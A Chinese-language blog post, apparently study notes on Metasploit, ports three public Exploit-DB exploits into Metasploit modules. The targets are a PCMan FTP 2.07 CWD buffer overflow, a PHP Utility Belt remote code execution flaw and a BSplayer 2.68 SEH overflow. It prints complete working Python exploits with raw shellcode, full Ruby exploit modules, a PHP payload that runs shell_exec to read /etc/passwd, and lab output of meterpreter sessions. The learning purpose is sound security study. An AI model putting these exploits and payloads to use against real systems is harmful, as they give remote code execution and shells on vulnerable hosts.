---
title: MasterMsf 4 渗透模块的移植
category: metasploit
---

# {{ page.title }}

## 启程

> Hacking is not the desire in breaking things. It's the desire becoming a smart-ass in things you know nothing about – so others don't have to.

本章我们尝试将其他语言编写的exploit模块移植到Metasploit中。这样做有以下优点：

- 方便管理和经验积累
- 节省攻击时间，提高代码重用度
- 能够实现payload动态切换

## 移植Python开发的栈溢出ExP

本次我们将移植[PCMan FTP Server 2.07 - 'CWD' Remote Buffer Overflow](https://www.exploit-db.com/exploits/31255/)，对应CVE-2013-4730，PoC作者也上传了存在漏洞的应用程序。

作者在注释中说在`Windows 7 sp1 x64 (english)`测试通过，我认为他关闭了DEP和ASLR，因为他的代码是最直接的`填充 + 跳板 + payload`结构。我在XP上测试。

### 原ExP有效性测试

修改他的ExP如下：

```py
import socket as s
from sys import argv

if(len(argv) != 4):
    print "USAGE: %s host <user> <password>" % argv[0]
    exit(1)
else:
    #store command line arguments
    script,host,fuser,fpass=argv
    #vars
    junk = '\x41' * 2006 #overwrite function (CWD) with garbage/junk chars
    espaddress = '\x1c\x81\xd0\x7d'
    nops = '\x90' * 10
    shellcode = ( # BIND SHELL | PORT 4444
        "\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"
        "\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"
        "\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"
        "\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"
        "\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"
        "\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"
        "\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"
        "\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"
        "\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"
        "\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"
        "\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"
        "\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"
        "\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"
        "\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"
        "\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"
        "\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"
        "\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"
        "\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"
        "\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"
        "\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"
        "\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"
        "\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"
        "\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"
        "\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"
        "\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a\xcd")
    sploit = junk+espaddress+nops+shellcode
    #create socket
    conn = s.socket(s.AF_INET,s.SOCK_STREAM)
    #establish connection to server
    conn.connect((host,21))
    #post ftp user
    conn.send('USER '+fuser+'\r\n')
    #wait for response
    uf = conn.recv(1024)
    #post ftp password
    conn.send('PASS '+fpass+'\r\n')
    #wait for response
    pf = conn.recv(1024)
    #send ftp command with sploit
    conn.send('CWD '+sploit+'\r\n')
    cf = conn.recv(1024)
    #close connection
    conn.close()
```

测试：

![Bildschirmfoto 2018-10-27 um 4.00.06 PM.png]({{ site.url }}/images/metasploit/9E0105F79CE0C623497DFA0E19FB931D.png)

结论：ExP有效。

### 移植到Metasploit

移植很容易，首先从上面的ExP收集到信息如下：

```bash
port: 21
Offset: 2006
jmp_esp: 0x7dd0811c
nops_num: 10
# added by us
username: anonymous
password: anonymous
```

得到exploit模块如下：

```ruby
class MetasploitModule < Msf::Exploit::Remote
	Rank = NormalRanking
	include Msf::Exploit::Remote::Ftp
	
	def initialize(info = {})
	    super(update_info(info,
			'Name'		=> 'PCMAN FTP 2.07 CWD Command Buffer Overflow',
			'Description' => %q{
				PCMAN FTP 2.07 CWD Command Buffer Overflow Example
			},
			'Platform'	=> 'win',
			'Author' => 'Rambo',
			'Targets'	=> [ 
						['Windows XP SP3', {'Ret' => 0x7dd0811c, 'Offset' => 2006}]
					   ],
			'Payload'       => {
						'Space'    => 1000,
						'BadChars' => "\x20\x0a\x0d\x00\xff\x40",
						},
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'VERBOSE' => true
				},
			'DisclosureDate' => 'Jan 29 2014'
		))
		register_options(
		[
			Opt::RPORT(21),
			OptString.new('FTPPASS', [true, 'FTP Password', 'anonymous'])
		], self.class)
	end 

	def exploit
		c = connect_login
		return unless c
		buf = make_nops(target['Offset'])
		buf = buf + [target['Ret']].pack('V') + make_nops(10) + payload.encoded
		send_cmd(["CWD " + buf, false])
		disconnect
	end  
end
```

可以发现，核心库的ftp模块帮我们做了很多事情。如果在编写模块时不知道ftp模块能提供什么，可以直接去读它的源码。

我有一个问题：本次的exploit函数最后没有`handler`。之前在[MasterMsf 3 渗透模块开发](https://wohin.me/metasploit/2018/10/21/masterMsf-chp3.html)中我们提到handler是把连接交给payload，去检查是否渗透成功并建立了新链接。那么这里为什么没有这个操作，却还能获得一个meterpreter？（谁去尝试连接payload监听的4444端口？）

后来我把之前的模块中的`handler`注释掉，发现依然能够获得shell。另外看了Msf自带的exploit模块，似乎也没有handler。这说明，至少在当前版本下的Msf中，`handler`不是必要的了，或者说它真的就只是检查的功能。整个`exploit`命令应该负责了payload的连接。这部分等将来读Metasploit源代码时再研究。

测试：

![Bildschirmfoto 2018-10-27 um 4.22.47 PM.png]({{ site.url }}/images/metasploit/E3DBC5ACAA461B537B12BCDA3869325F.png)

### 为模块添加check方法

顾名思义，check就是检查目标系统是否存在我们指定的漏洞。最常用的方法是检查目标程序的版本，而检查版本其实就是写一个`ftp_version`的辅助扫描模块，只不过是封装在名为`check`的函数里，放在exploit模块中。代码如下：

```ruby
    def check
        c = connect_login
        disconnect
        if c and banner =~ /220 PCMan's FTP Server 2\.0/
            vprint_status("Able to authenticate, and banner shows the vulnerable version")
            return Exploit::CheckCode::Appears
        elsif (not c) and banner =~ /220 PCMan's FTP Server 2\.0/
            vprint_status("Unable to authenticate, but banner shows the vulnerable version")
            return Exploit::CheckCode::Appears
        end
        return Exploit::CheckCode::Safe
    end
```

测试：

```
msf exploit(rambo/my_pcman) > check

[*] 172.16.56.134:21 - Connecting to FTP server 172.16.56.134:21...
[*] 172.16.56.134:21 - Connected to target FTP server.
[*] 172.16.56.134:21 - Authenticating as anonymous with password anonymous...
[*] 172.16.56.134:21 - Sending password...
[*] 172.16.56.134:21 - Able to authenticate, and banner shows the vulnerable version
[*] 172.16.56.134:21 The target appears to be vulnerable.
```

参考[How to write a check() method](https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-check%28%29-method)，其中有一些编写check方法的原则：

- 使用`v`开头的输出方法，如`vprint_status`
- 一旦决定了目标的漏洞情况，应该返回一个CheckCode，分别如下：
    - Exploit::CheckCode::Unknown 情况未知
    - Exploit::CheckCode::Safe 没有触发漏洞
    - Exploit::CheckCode::Detected 目标程序版本符合，但check失败
    - Exploit::CheckCode::Appears 根据一些banner判断可能存在漏洞
    - Exploit::CheckCode::Vulnerable 硬性证据表明存在漏洞
- 如果是为引入了`Scanner`的辅助模块编写check，则应该编写如下方法而非check：

```ruby
def check_host(ip)
  # Do your thing
end
```

## 移植Web应用RCE漏洞的ExP

本次我们将根据[PHP Utility Belt - Remote Code Execution](https://www.exploit-db.com/exploits/38901/)编写ExP，作者也上传了存在漏洞的应用程序。

### 漏洞环境搭建

这是一个PHP应用程序，我们采用Docker来搭建本次漏洞环境，参考[docs/php/README.md](https://github.com/docker-library/docs/blob/master/php/README.md)使用LAP架构。

我们在宿主机上建立如下目录结构：

```
testPHP/
    |- Dockerfile
    |- src/
```

`src/`中存放PHP程序。

Dockerfile如下：

```dockerfile
FROM php:7.2-apache
MAINTAINER Bonan Ruan "xxx@rambo.com"

COPY src/ /var/www/html/
# executed when the image is being constructed
EXPOSE 80
EXPOSE 4444
```

构建并运行：

```bash
docker build -t my-php-app .
docker run -d -p 8080:80 -p 4444:4444 --name my-running-app my-php-app
```

测试一下环境是否正常：

![Bildschirmfoto 2018-10-27 um 5.31.51 PM.png]({{ site.url }}/images/metasploit/DD263C0824226A28686CC02227A3340E.png)

成功运行程序，说明环境正常。

### 漏洞有效性测试

根据exploit-db上的内容，我们在运行框中输入

```php
fwrite(fopen('info.php', 'w'),'<?php $a = "cat /etc/passwd"; echo shell_exec($a);?>');
```

运行，然后访问`info.php`：

![Bildschirmfoto 2018-10-27 um 5.43.36 PM.png]({{ site.url }}/images/metasploit/E4ECC25984CFF5530AE9CB8E30DEB10B.png)

说明漏洞存在。

### 漏洞分析

“漏洞”位于`ajax.php`中：

```php
# Home module (run arbitrary PHP)
if ( isset( $_POST['code'] ) ) {
	if ( false === eval( $_POST['code'] ) )
		echo 'PHP Error encountered, execution halted';
}
```

不过这个真的算漏洞吗？

[PHP Utility Belt 远程代码执行漏洞的验证与分析](https://www.freebuf.com/articles/web/99176.html)有一个漏洞分析。我觉得这个不算是漏洞，这个程序本身就是供开发人员测试代码使用的，所以能够执行PHP代码不是很正常吗？真要说漏洞，那么就是人。如果开发人员把它暴露在公网上，那就是开发人员的漏洞。

### 收集信息

我们的目的是获取shell。根据之前的分析，我们需要提交code参数的POST请求。

Metasploit中开发与Web相关的模块要用到的大多数函数都在`msf/core/exploits/http/client.rb`中。而`rex/proto/http/client.rb`和`rex/proto/http/client_request.rb`包含GET/POST请求的核心变量和方法。

我们利用`msf/core/exploits/http/client.rb`中的以下方法创建HTTP请求，它们是相似的：

```ruby
  # Connects to the server, creates a request, sends the request, reads the response
  # Passes +opts+ through directly to Rex::Proto::Http::Client#request_raw.
  def send_request_raw(opts={}, timeout = 20)
    if datastore['HttpClientTimeout'] && datastore['HttpClientTimeout'] > 0
      actual_timeout = datastore['HttpClientTimeout']
    else
      actual_timeout =  opts[:timeout] || timeout
    end
    begin
      c = connect(opts)
      r = c.request_raw(opts)
  # ...

  # Connects to the server, creates a request, sends the request,
  # reads the response
  # Passes `opts` through directly to {Rex::Proto::Http::Client#request_cgi}.
  # @return (see Rex::Proto::Http::Client#send_recv))
  def send_request_cgi(opts={}, timeout = 20, disconnect = true)
    if datastore['HttpClientTimeout'] && datastore['HttpClientTimeout'] > 0
      actual_timeout = datastore['HttpClientTimeout']
    else
      actual_timeout =  opts[:timeout] || timeout
    end

    print_line("*" * 20) if datastore['HttpTrace']

    begin
      c = connect(opts)
      r = c.request_cgi(opts)
      if datastore['HttpTrace']
        print_line('#' * 20)
        print_line('# Request:')
        print_line('#' * 20)
        print_line(r.to_s)
      end

      res = c.send_recv(r, actual_timeout)
  # ...
```

`rex/proto/http/client_request.rb`告诉我们，需要传哪些值给上面的发送请求函数：

```ruby
class ClientRequest

  DefaultUserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
  DefaultConfig = {
    #
    # Regular HTTP stuff
    #
    'agent'                  => DefaultUserAgent,
    'cgi'                    => true,
    'cookie'                 => nil,
    'data'                   => '',
    'headers'                => nil,
    'raw_headers'            => '',
    'method'                 => 'GET',
    'path_info'              => '',
    'port'                   => 80,
    'proto'                  => 'HTTP',
    'query'                  => '',
    'ssl'                    => false,
    'uri'                    => '/',
    'vars_get'               => {},
    'vars_post'              => {},
    'version'                => '1.1',
    'vhost'                  => nil,
```

我们关注其中两个：`method`和`uri`。

### 编写模块

模块要完成的任务：

- 创建POST请求
- 利用code参数将payload发送给服务器
- 获得shell

模块代码如下：

```ruby
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::HttpClient

    def initialize(info = {})
        super(update_info(info,
            'Name'      => 'PHP Utility Belt RCE',
            'Description' => %q{
                This module exploits a RCE vuln in PHP Utility Belt
            },
            'Platform'  => 'php',
            'Author' => 'Rambo',
            'Targets'   => [
                ['PHP Utility Belt', {}]
            ],
            'Payload'       => {
                'Space'    => 2000,
                'DisableNops' => true
            },
            'DisclosureDate' => 'May 16 2015',
            'DefaultTarget' => 0
        ))
        register_options(
        [
            OptString.new('TARGETURI', [true, 'The Path to PHP Utility Belt', '/ajax.php']),
            OptString.new('CHECKURI', [false, 'Checking Purpose', '/info.php'])
        ], self.class)

    end
    def check
        send_request_cgi(
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path),
            'vars_post' => {
                'code' => "fwrite (fopen('info.php', 'w'), '<?php echo phpinfo();?>');"
            }
        )
        resp = send_request_raw(
            'method' => 'GET',
            'uri' => normalize_uri(datastore['CHECKURI'])
        )
        if resp.body =~ /phpinfo()/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
    end
    def exploit
        send_request_cgi(
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path),
            'vars_post' => {
                'code' => payload.encoded
            }
        )
    end
end 
```

注意，我们在Payload中设置了`'DisableNops' => true`，也就是不要payload中的nop填充，因为目标平台是PHP。拓展一下，参考`lib/msf/base/simple/payload.rb`，我们可以得知Payload的设置选项有以下这些：

```ruby
    # Generate the payload
    e = EncodedPayload.create(payload,
        'BadChars'    => opts['BadChars'],
        'MinNops'     => opts['NopSledSize'],
        'Encoder'     => opts['Encoder'],
        'Iterations'  => opts['Iterations'],
        'ForceEncode' => opts['ForceEncode'],
        'DisableNops' => opts['DisableNops'],
        'Space'       => opts['MaxSize'])
```

实际上，这个模块也存在于官方modules中，位于`modules/exploits/multi/http/php_utility_belt_rce.rb`。我们对比一下自定义的和官方的，发现有一下不同：

```ruby
Rank = ExcellentRanking

'Arch'           => ARCH_PHP

def check
  txt = Rex::Text.rand_text_alpha(8)
  res = http_send_command("echo #{txt};")

  if res && res.body.include?(txt)
    Exploit::CheckCode::Vulnerable
  else
    Exploit::CheckCode::Safe
  end
end
```

可以发现官方模块对细节描述更准确，同时其check方法更为简洁。

测试：

```
msf exploit(rambo/my_phputilitybelt) > check
[+] 127.0.0.1:8080 The target is vulnerable.

msf exploit(rambo/my_phputilitybelt) > exploit

[*] Started bind TCP handler against 127.0.0.1:4444
[*] Sending stage (37775 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:57837 -> 127.0.0.1:4444) at 2018-10-28 10:46:17 +0800

meterpreter > getuid
Server username: www-data (33)
```

## 移植针对TCP客户端漏洞的ExP

本次我们将根据[Bsplayer 2.68 - HTTP Response Universal](https://www.exploit-db.com/exploits/36477/)编写ExP，作者也上传了存在漏洞的应用程序。

漏洞程序是BSplayer播放器，当用户使用它打开一个URL去播放视频时，可能发生缓冲区溢出。原ExP语言为Python。

### 原ExP有效性测试

我使用的环境是Windows XP SP3，没有修改任何内容，直接运行原ExP，竟然可以弹计算器。

```py
#!/usr/bin/python

import socket
import sys
s = socket.socket()         # Create a socket object
if(len(sys.argv) < 3):
  print "[x] Please enter an IP and port to listen to."
  print "[x] " + sys.argv[0] + " ip port"
  exit()
host = sys.argv[1]	    # Ip to listen to.
port = int(sys.argv[2])     # Reserve a port for your service.
s.bind((host, port))        # Bind to the port
print "[*] Listening on port " + str(port)
s.listen(5)                 # Now wait for client connection.
c, addr = s.accept()        # Establish connection with client.
# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
print(('[*] Sending the payload first time', addr))
c.recv(1024)
#seh and nseh.
buf =  ""
buf += "\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a"
buf += "\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94"
buf += "\x96\x4f\x67\xde\xfa\x63\x0c\xb2\xee\xf0\x60\x1b\x01"
buf += "\xb0\xcf\x7d\x2c\x41\xfe\x41\xe2\x81\x60\x3e\xf8\xd5"
buf += "\x42\x7f\x33\x28\x82\xb8\x29\xc3\xd6\x11\x26\x76\xc7"
buf += "\x16\x7a\x4b\xe6\xf8\xf1\xf3\x90\x7d\xc5\x80\x2a\x7f"
buf += "\x15\x38\x20\x37\x8d\x32\x6e\xe8\xac\x97\x6c\xd4\xe7"
buf += "\x9c\x47\xae\xf6\x74\x96\x4f\xc9\xb8\x75\x6e\xe6\x34"
buf += "\x87\xb6\xc0\xa6\xf2\xcc\x33\x5a\x05\x17\x4e\x80\x80"
buf += "\x8a\xe8\x43\x32\x6f\x09\x87\xa5\xe4\x05\x6c\xa1\xa3"
buf += "\x09\x73\x66\xd8\x35\xf8\x89\x0f\xbc\xba\xad\x8b\xe5"
buf += "\x19\xcf\x8a\x43\xcf\xf0\xcd\x2b\xb0\x54\x85\xd9\xa5"
buf += "\xef\xc4\xb7\x38\x7d\x73\xfe\x3b\x7d\x7c\x50\x54\x4c"
buf += "\xf7\x3f\x23\x51\xd2\x04\xdb\x1b\x7f\x2c\x74\xc2\x15"
buf += "\x6d\x19\xf5\xc3\xb1\x24\x76\xe6\x49\xd3\x66\x83\x4c"
buf += "\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22"
buf += "\x8c\xcd\x11\xc2\x37\x12"

jmplong = "\xe9\x85\xe9\xff\xff"
nseh = "\xeb\xf9\x90\x90"
# Partially overwriting the seh record (nulls are ignored).
seh = "\x3b\x58\x00\x00"
buflen = len(buf)
response = "\x90" *2048 + buf + "\xcc" * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ "\xcc" * 7000
c.send(response)
c.close()
c, addr = s.accept()        # Establish connection with client.
# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
print(('[*] Sending the payload second time', addr))
c.recv(1024)
c.send(response)
c.close()
s.close()
```

测试：

```
python2 36477.py 172.16.56.1 10001
[*] Listening on port 10001
```

![Bildschirmfoto 2018-10-28 um 11.30.43 AM.png]({{ site.url }}/images/metasploit/0AB3FFE51B2EAC0E5299E5779D6FCF26.png)

弹出计算器，同时BSplayer崩溃退出：

![Bildschirmfoto 2018-10-28 um 11.31.54 AM.png]({{ site.url }}/images/metasploit/4BBCCBC8292EAFEEC2C8C87D6D02F4EF.png)

证明原ExP有效。

### 对原ExP的分析

未做任何改动就exploit成功，这引起了我的兴趣。我们来深入看一下原ExP是如何搞定这一切的。

其shellcode的排布与我在[0day安全 Chapter 3 开发shellcode的艺术](https://wohin.me/0day/2018/06/14/0day3.html)用图给出的优化模型一致，即通过长跳转的方式将shellcode放在缓冲区内。只不过采用的是溢出SEH去获得控制权。

他的代码中，最关键、最有意思的是这一句：

```py
# Partially overwriting the seh record (nulls are ignored).
seh = "\x3b\x58\x00\x00"
```

只有这里劫持控制流成功，后面的一切才能奏效。问题在于，作者怎么知道`0x0000583b`处一定是一个PPR呢？这很明显不是一个合法的指令地址，顶多算作偏移地址。一开始我想不通，后来看到作者的注释说`nulls are ignored`，忽然想到：将要被覆盖的是SEH节点中的异常处理函数指针，如果`\x00`会导致类似于`strcpy`时的截断，那么最终实际上只有异常处理函数指针的低两个字节被覆盖为了`0x583b`，高两个字节不变！我们假设原来的异常处理函数指针为`0xaabbccdd`，那么被覆盖后这个位置将变成`0xaabb583b`。所以作者只要确认这个位置一定是PPR即可。

为了验证这个思路，我在XP中打开漏洞程序，用Immunity附加上去，然后

```
!mona seh
```

去搜索所有的PPR。然后在结果中搜索`0x583b`。果然，其中有这么一条：

```
0x0069583b : pop ebx # pop ebp # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READWRITE} [bsplayer.exe]
```

然后在Immunity中转到这个地址：

![Bildschirmfoto 2018-10-28 um 8.33.32 PM.png]({{ site.url }}/images/metasploit/A7DC9D61B9090761CB7F20E919DDB3AC.png)

同时可以确认，这个位置落在bsplayer2.exe中：

![Bildschirmfoto 2018-10-28 um 8.34.04 PM.png]({{ site.url }}/images/metasploit/194B012BB335FCF88A72E4BFBA596CC0.png)

我们知道，在Vista及以后系统的ASLR机制中，程序各个模块的入口地址的后两个字节是不变的，随机化的只有前两个字节。结合这一点，我发现原ExP的设置极其巧妙：它只覆盖低两个字节，这样相当于利用了原异常处理函数指针的高两个字节，**从而绕过了ASLR！**

我认为这个猜想是正确的，但是还缺乏验证：需要确认，在程序执行到溢出发生点时，当时栈顶的SEH节点中的异常处理函数地址确实是在`[bsplayer.exe]`模块范围内（与低址为`0x583b`的PPR在同一个模块中，这样才能保证它们的高址相同）。从常理上来想这是合理的，因为开发者一般都会把自己的异常处理函数与程序主体放在一起（虽然可能在不同的源代码文件中，但最终会编译到一个exe中去）。

我想验证一下这个想法，思路是用OD跟到这个地方。然而直接用OD打开时，它提示我可能有加壳，于是查壳：

![Bildschirmfoto 2018-10-28 um 8.47.10 PM.png]({{ site.url }}/images/metasploit/E7D6CB8AE0D07E23980B8AE0A10F5602.png)

没问题，`upx -d`脱壳。脱壳后再次查壳：

![Bildschirmfoto 2018-10-28 um 8.47.46 PM.png]({{ site.url }}/images/metasploit/C9BA5525374A5841F0BD585CCE690306.png)

这说明还有壳，或者代码混淆，但是验证后发现并不是`yoda's Protector`，所以这里应该是PEiD出错。用IDA打开，果然，只有一小段是指令，其他大部分都是数据段。我尝试用OD跟，但是程序似乎有反调试。我对脱壳不太熟，所以先到此为止，回到主线上来。

另外，原ExP发送了两次数据，我们先不管为什么这样做，要关注的是怎样把别的语言编写的ExP移植成Metaspllit模块。

最后，由于这是一个基于SEH的溢出，所以也会绕过GS。那么就只剩DEP和SafeSEH了。

---

**更新**

后来我在[Bsplayer 2.68 - HTTP Response Buffer Overflow](https://rstforums.com/forum/topic/89205-bsplayer-268-http-response-buffer-overflow/)读到原ExP作者本人写的一段话：

> Bsplayer suffers from a buffer overflow vulnerability when processing the
HTTP response when opening a URL. In order to exploit this bug I needed to
load a dll with no null addresses and no safeseh ,ASLR or DEP. I noticed
that one of the dlls that matches this criteria is (MSVCR71.dll) and it's
loaded when I loaded an flv file over the network and that's why I'm
sending a legitimate flv file first so later we can use the loaded dll.
Also the space after the seh record is pretty small so what I did is that I
added a small stage shell cdoe to add offset to esp so it points at the
beginning of my buffer and then a jmp esp instruction to execute the actual
shellcode.

这样一来似乎可以解释为什么要发两遍数据，但是又引入了一些新问题。

**再更新**

就上面的疑问我请教了原ExP的作者，得到的答复如下：

> the explanation in the forum was for an older exploit, when I sent the new one exploit-db decided to remove the old one.  
> your first guess is correct I am writing over 2 bytes of the seh address and the other two bytes  are already in memory.

---

### 编写模块

从原ExP中我们得到以下关键信息：

- 偏移量是2048
- PPR地址是0x0000583b
- 长跳转为"\xe9\x85\xe9\xff\xff"
- 短跳转为"\xeb\xf9\x90\x90"

需要注意的是，这个漏洞的触发方式与以往不同，需要攻击者首先开启监听，等待目标机器发来请求，然后再将payload发送给对方。我们的模块这次扮演server角色。

```ruby
class MetasploitModule < Msf::Exploit::Remote
	Rank = NormalRanking
	include Msf::Exploit::Remote::TcpServer
	
	def initialize(info = {})
	    super(update_info(info,
			'Name'		=> 'BsPlayer 2.68 SEH Overflow Exploit',
			'Description' => %q{
				Here's an example of Server Based Exploit
			},
			'Platform'	=> 'win',
			'Author' => 'Rambo',
			'Targets'	=> [ 
						['Generic', {'Ret' => 0x0000583b, 'Offset' => 2048}]
					   ],
			'Payload'       => {
						'Space' => 500,
						'BadChars' => "\x20\x0a\x0d\x00"
						},
			'DisclosureDate' => 'Mar 24 2015'
		))
	end
	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)
		print_status("Client Connected")
		sploit = make_nops(target['Offset'])
		sploit << payload.encoded
		sploit << "\xcc" * (6787 - 2048 - payload.encoded.length)
		sploit << "\xe9\x85\xe9\xff\xff" # long jmp
		sploit << "\xeb\xf9\x90\x90" # short jmp
		sploit << [target.ret].pack('V')
		client.put(sploit)
		client.get_once
		client.put(sploit)
		handler(client)
		service.close_client(client)
	end
end
```

一开始我把`nil`错写成了`null`，导致攻击失败。然而在载入模块时Metasploit竟然没有报错，但是在`irb`中写`a = null`会报错，这说明`null`应该是Metasploit定义的。

我们这次引入了`Msf::Exploit::Remote::TcpServer`，这也与扮演的角色相符。它会提供处理传入请求需要的方法和选项，如`SRVHOST`和`SRVPORT`等。用到的方法如`on_client_connect`和`client.put`等都很好理解，后者和上一章使用`Msf::Exploit::Remote::Tcp`的`sock.put`很像。我们借助`client.get_once`去保证数据分两次发送。*当数据分两次发送后，使用handler查找从渗透模块传回的会话*（所以handler的作用到底是什么？为什么本章第一个实验中不需要使用`handler`？）。

测试：

不再贴上配置模块的过程，payload用反向shell。

![Bildschirmfoto 2018-10-28 um 9.58.47 PM.png]({{ site.url }}/images/metasploit/1F9BEE341425AD8D7EDB8A70A9A58AF2.png)

```
msf exploit(rambo/my_bsplayer) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  DESTINY-7846DE5\Administrator @ DESTINY-7846DE5  172.16.56.1:4444 -> 172.16.56.134:1115 (172.16.56.134)

msf exploit(rambo/my_bsplayer) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESTINY-7846DE5\Administrator
```

最后，其实除了TcpServer，Metasploit还有HttpServer，能够建立HTTP服务器。

## 总结

Exploit-DB对于研究学习相当有帮助！整个过程中凸显出来短板在于**漏洞发现、漏洞点定位**能力。未来有侧重地学习研究应该可以补足。

通过这一章的学习研究，我深刻体会到了逆向能力的重要，下层基础决定上层建筑。

从第二章到第四章，已经学习了辅助模块、后渗透模块和渗透模块的开发。Metasploit真的很强大，但是我对于它的内部运行机制还有很多不懂的地方。未来打算研究一下它的内部原理了。

另外，将别的语言编写的ExP移植到Metasploit很轻松。